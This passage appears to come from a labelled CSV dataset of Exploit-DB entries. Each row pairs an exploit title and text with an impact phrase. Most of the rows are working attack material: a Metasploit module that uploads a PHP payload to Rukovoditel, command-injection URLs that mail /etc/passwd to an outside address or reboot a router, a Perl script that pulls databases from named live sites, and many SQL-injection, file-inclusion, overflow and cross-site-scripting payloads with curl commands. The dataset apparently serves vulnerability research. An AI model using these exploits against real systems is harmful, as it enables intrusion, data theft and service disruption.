OnKeyDown=""document.forms[0].fileupload.focus();"" asdfnKeyDown=""document.forms[0].txt.fireEvent('onKeyPress');"" onClick=""""> visible </FORM> </BODY> </HTML>",initiate file uploads from unsuspecting users,1
23558,PHPix 2.0.3 - Arbitrary Command Execution source: https://www.securityfocus.com/bid/9458/info  It has been reported that PHPix is vulnerable to a remote command execution vulnerability due to poor handling of externally supplied data such as shell metacharacters. This issue may allow unauthorized access to the affected system with the privileges of the web server hosting the vulnerable program.  http://www.example.com/phpix/index.phtml?mode=view&album=`cat%20/etc/passwd%20|%20mail%20someone@somewhere.com`&pic=A-10.jpg&dispsize=640&start=0  http://www.example.com/phpix/index.phtml?mode=view&album=Sample+Album&pic=A-10.jpg&dispsize=`cat%20/etc/passwd%20|%20mail%20someone@somewhere.com`&start=0  http://www.example.com/phpix/index.phtml?mode=view&album=Sample+Album&pic=`cat%20/etc/passwd%20|%20mail%20someone@somewhere.com`&dispsize=640&start=0,command execution,1
33998,"Joomla! Component JComments 2.1 - 'ComntrNam' Cross-Site Scripting source: https://www.securityfocus.com/bid/40230/info  The JComments component for Joomla! is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Versions prior to JComments 2.2 are vulnerable.   <form method=""POST"" action=""http://joomla/administrator/index.php"" name=""main""> <input type=""hidden"" name=""name"" value='ComntrName""><script>alert(document.cookie)</script>'> <input type=""hidden"" name=""email"" value=""example@example.com""> <input type=""hidden"" name=""comment"" value=""comment text""> <input type=""hidden"" name=""published"" value=""1""> <input type=""hidden"" name=""option"" value=""com_jcomments""> <input type=""hidden"" name=""id"" value=""1""> <input type=""hidden"" name=""task"" value=""save""> </form> <script> document.main.submit(); </script>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
9862,"3Com OfficeConnect - Code Execution ####### Remote command execution  #######  http://1.2.3.4/utility.cgi?testType=1&IP=aaa || cat /etc/passwd  To see the command output you need to log into the router, however the command is executed even the user is not logged in, so if you don't have access to the device a DOS is also possible:  http://1.2.3.4/utility.cgi?testType=1&IP=aaa || reboot",command execution,1
46011,"Rukovoditel Project Management CRM 2.3.1 - Remote Code Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core' require 'uri'  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper      def initialize     super(       'Name'           => 'Rukovoditel Project Management/CRM 2.3.1 - (Authenticated) Remote Code Execution',       'Description'    => %q{         This module exploits a file upload vulnerability in Rukovoditel PM/CRM version 2.3.1.         Application allows the user to upload a background image, and does not perform extension checking exactly.         Application agrees to upload if ""gif"" file header is added to the header of our payload file.         However, many file types do not have permission to work. "".htaccess"" is blocking that.         it has file extension check as follows,         <FilesMatch ""\.(php([0-9]|s)?|s?p?html|cgi|pl|exe)$"">         There is no upper and lower case control. Therefore, the extension of our file can be .pHp .Php .PhP and such.         The module is uploading by create a payload as above to get Meterpreter session.       },       'Author'         => [         'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf Module         ],       'License'        => MSF_LICENSE,       'References'     =>         [           ['URL', ' https://pentest.com.tr/exploits/Rukovoditel-Project-Management-CRM-2-3-1-Authenticated-Remote-Code-Execution.html'],            ['CVE', '2018-20166'],         ],       'Platform'       => ['php'],       'Arch'           => ARCH_PHP,       'Targets'        =>         [           ['Rukovoditel PM/CRM <= 2.3.1', {}]         ],       'DisclosureDate' => '14 Dec 2018',       'Privileged'     => false,       'DefaultTarget' => 0     )      register_options(         [           OptString.new('TARGETURI', [true, 'The base path to i-doit', '/']),           OptString.new('USER', [true, 'User to login with', 'admin']),           OptString.new('PASS', [true, 'Password to login with', 'password']),         ], self.class)     end ## # Exploitation of Vulnerability ##   def exploit      random_value = Rex::Text.rand_text_alpha(10)     sid_md5 = Digest::MD5.hexdigest random_value     print_status(""sid = #{sid_md5}"")      cookie = ""cookie_test=please_accept_for_session;"" + "" sid="" + sid_md5      res1 = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri, ""/index.php?module=users/login""),       'cookie'   => cookie,     })         if not (res1 and res1.body =~ /form_session_token\"" value=\""([^\""]+)\""/)             return nil         end     token = $1 ## # Authorized User Login ##      res = send_request_cgi({       'method' => 'POST',       'uri'    => normalize_uri(target_uri, ""/index.php?module=users/login&action=login""),       'cookie'   => cookie,       'vars_post' => {           ""form_session_token"" => token,           ""username"" => datastore['USER'],           ""password"" => datastore['PASS']        }     }) ## # Login Control ##      tok = send_request_cgi({       'method'   => 'GET',       'cookie'   => cookie,       'uri'      => normalize_uri(target_uri, ""/index.php?module=dashboard/""),     })      html = tok.body     if html =~ /Rukovoditel/       print_good(""Login Successful"")     else       print_status(""User information is incorrect. Login failed"")       exit 0     end ## # Arbitrary "".pHp"" file upload ##      boundary = Rex::Text.rand_text_alphanumeric(29)      data = ""-----------------------------{boundary}\r\n""     data << ""Content-Disposition: form-data; name=\""form_session_token\""\r\n""     data << ""\r\n""     data << ""{token}""     data << ""\r\n-----------------------------{boundary}\r\n""     data << ""Content-Disposition: form-data; name=\""CFG[LOGIN_PAGE_HEADING]\""\r\n""     data << ""\r\nPage-Heading\r\n-----------------------------{boundary}\r\n""     data << ""Content-Disposition: form-data; name=\""CFG[LOGIN_PAGE_CONTENT]\""\r\n""     data << ""\r\nPage-Desc\r\n-----------------------------{boundary}\r\n""     data << ""Content-Disposition: form-data; name=\""APP_LOGIN_PAGE_BACKGROUND\""; filename=\""akkus.pHp\""\r\n""     data << ""Content-Type: binary/octet-stream\r\n""     data << ""\r\n""     data << ""GIF89a;\n<html>\n""     data << ""\n</html>\n""     data << payload.encoded     data << ""\r\n-----------------------------{boundary}\r\n""     data << ""Content-Disposition: form-data; name=\""CFG[APP_LOGIN_PAGE_BACKGROUND]\""\r\n""     data << ""\r\n{upload_name}\r\n""     data << ""-----------------------------{boundary}\r\n""     data << ""Content-Disposition: form-data; name=\""CFG[LOGIN_PAGE_HIDE_REMEMBER_ME]\""\r\n""     data << ""\r\n0\r\n-----------------------------{boundary}--\r\n""      res2 = send_request_cgi({       'method' => 'POST',       'data'  => data,       'headers' =>       {         'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}',         'cookie'   => cookie,       },       'uri' => normalize_uri(target_uri, ""/index.php?module=configuration/save&redirect_to=configuration/login_page"")      })   ## # Informations ##     print_status(""#{peer} - Uploading in progress..."")     print_good(""Upload Successful"") ## # Calling Shell File Name ##     shellc = send_request_cgi({       'method'   => 'GET',       'cookie'   => cookie,       'uri'      => normalize_uri(target_uri, ""/index.php?module=configuration/login_page""),     })          if not (shellc and shellc.body =~ /CFG_APP_LOGIN_PAGE_BACKGROUND\"" value=\""([^\""]+)\""/)             return nil         end     shelln = $1     print_good(""#{peer} - Payload uploaded as #{shelln}"")     register_file_for_cleanup(shelln) ## # Get Session ##     send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri, ""/uploads/"", shelln),     })    end end","upload a background image, and does not perform extension checking exactly",1
22803,"Kerio MailServer 5.6.3 do_map Module - Overflow source: https://www.securityfocus.com/bid/7967/info     Multiple buffer overrun vulnerabilities have been discovered in Kerio MailServer, which affect the webmail component. The problem occurs when handling usernames of excessive length and likely occurs due to insufficient bounds checking. Due to the similarity of these issues it has been conjectured that the root of the problem may be a single function used to handle all affected procedures.     Successful exploitation of this vulnerability could potentially result in the execution of arbitrary code, with the privileges of the Kerio MailServer process.  http://[Server]/do_map? action=new&oldalias=eso&alias=aaa&folder=public&user=AAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAA","the execution of arbitrary code, with the privileges of the Kerio MailServer process",1
8610,"Ublog access version - Arbitrary Database Disclosure #!/usr/bin/perl # # # Ublog access version # mdb-database/blog.mdb # dork : http://www.google.co.ma/search?q=index.asp%3Farchivio%3DOK&hl=fr&start=20&sa=N # demos : # http://radiologyhunters.com/blog/mdb-database/blog.mdb # http://foges.net/mdb-database/blog.mdb # http://www.geoaurea.it/mdb-database/blog.mdb # # use LWP::Simple; use LWP::UserAgent;  print ""\tUblog access version Arbitrary Database Disclosure Exploit\n"";  print ""\t****************************************************************\n""; print ""\t*      Found And Exploited By : Cyber-Zone (ABDELKHALEK)       *\n""; print ""\t*           E-mail : Paradis_des_fous[at]hotmail.fr            *\n""; print ""\t*          Home : WwW.IQ-TY.CoM , WwW.No-Exploit.CoM           *\n""; print ""\t*               From : MoroccO Figuig/Oujda City               *\n""; print ""\t****************************************************************\n\n\n\n""; if(@ARGV < 1) { &help; exit(); } sub help() { print ""[X] Usage : perl $0 site \n""; print ""[X] Exemple : perl $0 www.site.com \n""; } ($site) = @ARGV; print(""Please Wait ! Connecting To The Server ......\n\n""); sleep(5); $database = ""mdb-database/blog.mdb""; my $exploit = ""http://"" . $site . ""/"" . $database; print(""Searching For file ...\n\n""); sleep(3); $doexploit=get $exploit; if($doexploit){ print(""..........................File Contents...........................\n""); print(""$doexploit\n""); print(""..............................EOF.................................\n""); } else { help(); exit; }  # milw0rm.com [2009-05-04]",information disclosure,1
4795,"XZero Community Classifieds 4.95.11 - Remote File Inclusion # XZero Community Classifieds  <= v4.95.11 Remote File Inclusion # linK : http://www.xzeroscripts.com # download: http://rapidshare.com/files/66809648/XZCl4.95.11.rar # # (c)od3d and f0unded by Kw3rLn from Romanian Security Team a.K.A http://rstzone.org # # we have in config.inc.php: #    line303:    require_once(""{$path_escape}ipblock.inc.php""); # # link: http://site.com/config.inc.php?path_escape=shell.txt%00 # # meri crismas...hohoho # greetz to all RST [rstzone.org] MEMBERZ !  # milw0rm.com [2007-12-26]",code execution,1
7178,"BitDefender - Module pdf.xmd Infinite Loop Denial of Service (PoC) Deny Of Service and infinite loop in BitDefender (module pdf.xmd) /* ProTeuS @ cih.ms */ tested on pdf.xmd BitDefender's pdf engine by Alexandru Matei (0.1,Oct 8 2008), CRC32=A393F805 and on pdf.xmd last update by the moment of publication  Deny of service occurs during parsing of included compressed streams (gotta use bdc.exe /arc option) in cause of using /FlateDecode /ASCIIHexDecode compression options and object tag /JavaScript in pdf. From time to time occurs either DoS with rewriting of arithmetic registers with the contents of user's decrypted buffer or an infinite loop during scanning after modifying stream-buffer we have such results:  775781CB 8B49 04 MOV ECX,DWORD PTR DS:[ECX+4]  Access violation when reading [30333037] - use Shift+F7/F8/F9 to pass exception to program  EAX 04354E20 ECX 30333033 EDX 30333033 EBX 01BF0000 ESP 0012D5B8 EBP 0012D5E0 ESI 04354E18 EDI 04352100 EIP 775781CB ntdll.775781CB  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7178.zip (2008-BitDefenderDOS.zip)  # milw0rm.com [2008-11-20]",Deny Of Service,1
34155,"Ceica-GW - 'login.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/40917/info  Ceica-GW is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   The following example URIs are available:  http://www.example.com/Ceica/login.php/>""><marquee><font%20color=red%20size=15>XroGuE</font></marquee>  http://www.example.com/Ceica/login.php/>""><ScRiPt>alert(213771818860)</ScRiPt>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
33509,Joomla! Component com_tienda - 'categoria' Cross-Site Scripting source: https://www.securityfocus.com/bid/37798/info  The Joomla! 'com_artistavenue' component is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/index.php?option=com_tienda&task=verproducto&categoria=[XSS],execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
28167,"Invision Power Board (IP.Board) 1.x/2.x - Multiple SQL Injections source: https://www.securityfocus.com/bid/18836/info  Invision Power Board is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied data before using it in an SQL query.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/index.php?act=ketqua&code=showcat&idcat=[SQL]  http://www.example.com/index.php?act=Attach&type=post&id=[SQL]  http://www.example.com/index.php?act=Profile&CODE=[SQL]  http://www.example.com/index.php?act=ketqua&code=[SQL]  http://www.example.com/coins_list.php?member_id=[SQL]  http://www.example.com/index.php?act=Login&CODE=[SQL]  http://www.example.com/index.php?act=Help&CODE=[SQL]  http://www.example.com/index.php?act=ref&id=[SQL]","compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation",1
32318,"XRms 1.99.2 - 'login.php?target' Cross-Site Scripting source: https://www.securityfocus.com/bid/31008/info  XRMS CRM is prone to multiple input-validation vulnerabilities, including an unspecified SQL-injection issue, an HTML-injection issue, and multiple cross-site scripting issues. The vulnerabilities occur because the application fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/xrms/login.php?target=""><script>alert(1);</script>",the application fails to sufficiently sanitize user-supplied data,1
40065,"OpenFire 3.10.2 < 4.0.1 - Multiple Vulnerabilities # Several vulnerabilities doscovered in OpenFire version 3.10.2  to 4.0.1   ## Product Description  **OpenFire** is an opensource project under GNU GPL licence. It provides a Jabber/XMPP server fully develloped in Java. It's develloped by the **Ignite realtime** community. The actual version of the product is 4.0.2.   Official web site : http://igniterealtime.org/  Several vulnerabilities have been discovered between 2015, October and 2016, February. Reported vulnerabilities are similar to those previously discovered by hyp3rlinx, although they concern different pages.  In brief, the flaws are of the following kinds: CSRF, XSS (reflected and stored), file upload and information disclosure. Most vulnerabilities need an administration access to the web application and may lead to personal information leakage or account take-over.  **Ingnite realtime** fixed some vulnerabilities (the corresponding commit ID are indicated in this document).   ## Several Relected XSS Vulnerabilities identified in Openfire 3.10.2  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.2  [comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Reflected XSS may lead to session hijacking on admin user.  ### Proof of Concept  #### *domain* and *remotePort* variables from *server2server-settings.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&remotePort=5269&serverAllowed=Add+Server ```  or  ``` domain=testt&remotePort=5269%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverAllowed=Add+Server ```  or  ```  domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverBlocked=Block+Server ```  You can reproduce the exploitation with the following curl commands:  ``` curl --data ""domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&remotePort=5269&serverAllowed=Add+Server"" https://OpenFireServerIP:9090/server2server-settings.jsp --cookie=""JSESSIONID=XXX""   curl --data ""domain=test&remotePort=5269%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverAllowed=Add+Server"" https://OpenFireServerIP:9090/server2server-settings.jsp --cookie=""JSESSIONID=XXX""   curl --data ""domain=%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverBlocked=Block+Server"" https://OpenFireServerIP:9090/server2server-settings.jsp --cookie=""JSESSIONID=XXX""  ```  #### *criteria* variable from *plugins/search/advance-user-search.jsp*  The following GET request exploits the XSS vulnerability:  ``` http://OpenFireServerIP:9090/[[http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search ```   ## Several stored XSS Vulnerabilities identified in Openfire 3.10.2  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.5  [comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Stored XSS could lead to session hijacking on admin user.  ### Proof of Concept  #### *mucdesc* variable from *muc-service-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` save=true&mucname=test&mucdesc=test%22%2F%3E%3Cscript%3Ealert%28%27XSS-2%27%29%3C%2Fscript%3E ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style=""display:none"" name=""xss-frame""></iframe> <form id=""xss-form"" action=""http://OpenFireServerIP:9090/muc-service-edit-form.jsp"" > <input type=""text"" name=""save"" value=""true"" > <input type=""text"" name=""mucname"" value=""test"" > <input type=""text"" name=""mucdesc"" value=""%22/><script>alert('XSS')</script>"" > </form>  <script>document.getElementById(""xss-form"").submit()</script> ```  or with this curl command:  ``` curl --data ""save=true&mucname=test&mucdesc=test%22%2F%3E%3Cscript%3Ealert%28%27XSS-2%27%29%3C%2Fscript%3E"" https://OpenFireServerIP:9090/muc-service-edit-form.jsp --cookie=""JSESSIONID=XXX"" ```  #### *searchname* variable from *plugins/search/search-props-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` searchEnabled=true&searchname=search%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupOnly=false ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style=""display:none"" name=""xss-frame""></iframe> <form id=""xss-form"" action=""http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp?save"" method=""post"" target=""xss-frame"" > <input type=""text"" name=""searchEnabled"" value=""true"" > <input type=""text"" name=""searchname"" value=""search%22/><script>alert('XSS')</script>"" > <input type=""text"" name=""groupOnly"" value=""false"" > </form>  <script>document.getElementById(""xss-form"").submit()</script> ```  or with this curl command:  ``` curl ""http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp"" --data=""searchEnabled=true&searchname=%22/%3E%3Cscript%3Ealert('XSS')%3C/script%3E&groupOnly=false"" --cookie=""JSESSIONID=XXX"" ```   #### *searchname* variable from *page plugins/search/search-props-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` propName=adminConsole.port&propValue=9090%22+onmouseover%3D%22alert%28%27xxs%27%29%22+x%3D%22&encrypt=false&save=Save+Property ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style=""display:none"" name=""xss-frame""></iframe> <form id=""xss-form"" action=""http://OpenFireServerIP:9090/server-properties.jsp"" method=""post"" target=""xss-frame"" > <input type=""text"" name=""propValue"" value=""=adminConsole.port"" > <input type=""text"" name=""searchname"" value=""9090%22 onmouseover=%22alert('XSS')%22 x=""/> <input type=""text"" name=""encrypt"" value=""false"" > <input type=""text"" name=""save"" value=""Save Property"" > </form>  <script>document.getElementById(""xss-form"").submit()</script> ```  or with this curl command:  ``` curl --data ""searchEnabled=true&searchname=search%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupOnly=false"" https://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp --cookie=""JSESSIONID=XXX"" ```  #### *serverName* variable from *plugins/search/search-props-edit-form.jsp*  The following POST values can be sent to trigger the vulnerability:  ``` serverName=localhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverPort=5269&componentPort=5275&port=5222&sslEnabled=true&sslPort=5223&embeddedPort=9090&embeddedSecurePort=9091&jmxEnabled=false&jmxSecure=true&jmxPort=1099&save=Save+Properties ```  The following code allows the creation of a web frame exploiting the vulnerability:  ``` <iframe style=""display:none"" name=""xss-frame""></iframe> <form id=""xss-form"" action=""http://OpenFireServerIP:9090/server-props.jsp"" method=""post"" target=""xss-frame"" > <input type=""text"" name=""serverName"" value=""localhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"" > <input type=""text"" name=""serverPort"" value=""5269"" > <input type=""text"" name=""componentPort"" value=""5275"" > <input type=""text"" name=""port"" value=""5222"" > <input type=""text"" name=""sslEnabled"" value=""true"" > <input type=""text"" name=""sslPort"" value=""5223"" > <input type=""text"" name=""embeddedPort"" value=""9090"" > <input type=""text"" name=""embeddedSecurePort"" value=""9091"" > <input type=""text"" name=""jmxEnabled"" value=""false"" > <input type=""text"" name=""jmxSecure"" value=""true"" > <input type=""text"" name=""jmxPort"" value=""1099"" > <input type=""text"" name=""save"" value=""Save+Properties"" > </form>  <script>document.getElementById(""xss-form"").submit()</script> ```  or with this curl command:  ``` curl --data ""serverName=localhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverPort=5269&componentPort=5275&port=5222&sslEnabled=true&sslPort=5223&embeddedPort=9090&embeddedSecurePort=9091&jmxEnabled=false&jmxSecure=true&jmxPort=1099&save=Save+Properties"" https://OpenFireServerIP:9090/server-props.jsp --cookie=""JSESSIONID=XXX"" ```  ### Affected versions  * Version >= 3.10.2 and < 4.0.0   ## Several Relected XSS Vulnerabilities identified in Openfire 4.0.0 and 4.0.1  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.2  [comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Reflected XSS could lead to session hijacking against an administrator.  Some of these vulnerabilities have already been found by hyp3rlinx, but had not been patched properly.  ### Proof of Concept  #### *groupchatName*, *groupchatJID*, *users* and *groups* variables from *page create-bookmark.jsp* suffer from the vulnerability  The following POST values can be sent to trigger the vulnerability:  ``` groupchatName=%22%3E%3Cscript%3Ealert%28%27XSS1%27%29%3C%2Fscript%3E&groupchatJID=%22%3E%3Cscript%3Ealert%28%27XSS2%27%29%3C%2Fscript%3E%C2%B2&users=%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&groups=%22%3E%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&createGroupchatBookmark=Create&type=groupchat ```  The following curl command allows reproducing the attack against the Openfire *plugins/bookmarks/create-bookmark.jsp* page:  ``` curl --data ""save=true&mucname=conference&mucdesc=Public+Chatrooms%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"" https://OpenFireServerIP:9090/muc-service-edit-form.jsp --cookie=""JSESSIONID=XXX"" ```  #### *search* variable from *group-summary.jsp*  The following GET request exploit the XSS vulnerability:  ``` http://OpenFireServerIP:9090/group-summary.jsp?search=test%22+onmouseover%3Dalert%28%27XSS%27%29+x%3D%22 ```  The following curl command allows reproducing the attack against the Openfire *group-summary.jsp* page.  ``` curl http://OpenFireServerIP:9090/group-summary.jsp?search=test%22+onmouseover%3Dalert%28%27XSS%27%29+x%3D%22 --cookie=""JSESSIONID=XXX"" ```   #### *maxTotalSize*, *maxFileSize*, *maxDays*, *logTimeout* variables from *audit-policy.jsp*  The following GET request exploit the XSS vulnerability:  ``` http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=false&logDir=%2Fopt%2Fopenfire%2Flogs&maxTotalSize=1000%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&maxFileSize=10%22%3E%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&maxDays=-1%22%3E%3Cscript%3Ealert%28%27XSS5%27%29%3C%2Fscript%3E&logTimeout=120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%3C%2Fscript%3E&ignore=&update=Save+Settings ```  The following curl command allows reproducing the attack against the Openfire *audit-policy.jsp* page:  ``` curl ""http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=false&logDir=%2Fopt%2Fopenfire%2Flogs&maxTotalSize=1000%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&maxFileSize=10%22%3E%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&maxDays=-1%22%3E%3Cscript%3Ealert%28%27XSS5%27%29%3C%2Fscript%3E&logTimeout=120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%3C%2Fscript%3E&ignore=&update=Save+Settings"" --cookie=""JSESSIONID=XXX"" ```  #### *passPhrase* variables from *import-keystore-certificate.jsp*  The following POST values exploit the XSS vulnerability:  ``` passPhrase=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&privateKey=test&certificate=test&save=Save ```  The following curl command allows reproducing the attack against the Openfire *import-keystore-certificate.jsp* page.  ``` curl http://OpenFireServerIP:9090/import-keystore-certificate.jsp --data=""passPhrase=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&privateKey=test&certificate=test&save=Save"" --cookie=""JSESSIONID=XXX"" ```  #### *criteria* variable from */plugins/search/advance-user-search.jsp*  The following GET request exploit the XSS vulnerability:  ``` http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search ```  The following curl command allows reproducing the attack against the Openfire *plugins/search/advance-user-search.jsp* admin page.  ``` curl ""http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search"" --cookie=""JSESSIONID=XXX"" ```  ### Affected versions  * Version 4.0.0 and 4.0.1  ## Several stored XSS Vulnerabilities identified in Openfire 4.0.0 and 4.0.1  Some of these vulnerabilities have already been found by hyp3rlinx, but has not been patched since.  **Access Vector**: remote  **Security Risk**: low  **Vulnerability**: CWE-79  **CVSS Base Score**: 5.5  [comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O  ### Vulnerability Description  Several XSS vulnerabilities have been found on several pages of the administration panel. Stored XSS could lead to session hijacking on admin user.  ### Proof of Concept  #### *subdomain* variable from *connection-settings-external-components.jsp*  The following curl command allows reproducing the attack against the Openfire *connection-settings-external-components.jsp* page:  ``` curl --data ""subdomain=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&secret=toto&componentAllowed=Add+Component"" https://OpenFireServerIP:9090/connection-settings-external-components.jsp --cookie=""JSESSIONID=XXX"" ```  Or  ``` curl --data ""subdomain=%22%3Escript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&componentBlocked=Block+Component"" https://OpenFireServerIP:9090/connection-settings-external-components.jsp --cookie=""JSESSIONID=XXX"" ```  #### *mucdesc* variable from *muc-service-edit-form.jsp*  The following curl command allows reproducing the attack against the Openfire *muc-service-edit-form.jsp* page:  ``` curl --data ""groupchatName=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupchatJID=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%C2%B2&users=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groups=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBookmark=Create&type=groupchat"" https://OpenFireServerIP:9090/plugins/bookmarks/create-bookmark.jsp --cookie=""JSESSIONID=XXX"" ```  #### *groupchatName*, *groupchatJID*, *users* and *groups* variables from page muc-service-edit-form.jsp  The following curl command allows reproducing the attack against the Openfire *muc-service-edit-form.jsp* page:  ``` curl --data ""groupchatName=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groupchatJID=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%C2%B2&users=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&groups=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBookmark=Create&type=groupchat"" https://OpenFireServerIP:9090/plugins/bookmarks/create-bookmark.jsp --cookie=""JSESSIONID=XXX"" ```  #### *searchname* variable from *plugins/search/search-props-edit-form.jsp*  The following curl command allows reproducing the attack against the Openfire *plugins/search/advance-user-search.jsp* page:  ``` curl ""http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=true&moreOptions=false&criteria=admin%22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=Search"" --cookie=""JSESSIONID=XXX"" ```  The folling code allows exploiting the vulnerability:  ``` <iframe style=""display:none"" name=""xss-frame""></iframe> <form id=""xss-form"" action=""http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.jsp?save"" method=""post"" target=""xss-frame"" > <input type=""text"" name=""searchEnabled"" value=""true"" > <input type=""text"" name=""searchname"" value=""search%22/><script>alert('XSS')</script>"" > <input type=""text"" name=""groupOnly"" value=""false"" > </form>  <script>document.getElementById(""xss-form"").submit()</script> ```  #### *propValue* variable from *server-properties.jsp*  The 